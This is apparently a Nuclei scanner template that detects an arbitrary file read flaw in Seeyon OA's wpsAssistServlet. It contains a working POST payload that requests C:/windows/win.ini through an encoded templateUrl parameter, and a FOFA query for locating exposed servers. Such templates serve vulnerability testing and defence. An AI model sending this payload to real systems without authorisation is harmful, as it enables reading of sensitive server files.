http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - bit app support
    - fonts
    - extensions
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /seeyon/wpsAssistServlet HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Accept-Encoding: gzip


    flag=template&templateUrl=C%253A%252Fwindows%252Fwin.ini

    '
id: seeyon-oa-file-upload
info:
  author: Co5mos
  description: 'There is an arbitrary file read vulnerability in the Seeyon OA wpsAssistServlet
    interface.

    '
  metadata:
    fofa-query: "app=\"\u81F4\u8FDC\u4E92\u8054-OA\" && title=\"V8.0SP2\""
    max-request: 2
    verified: true
  name: Seeyon OA wpsAssistServlet - Arbitrary File Read
  reference:
  - https://avd.aliyun.com/detail?id=AVD-2023-1700012
  severity: critical
  tags: seeyon,oa,file-read
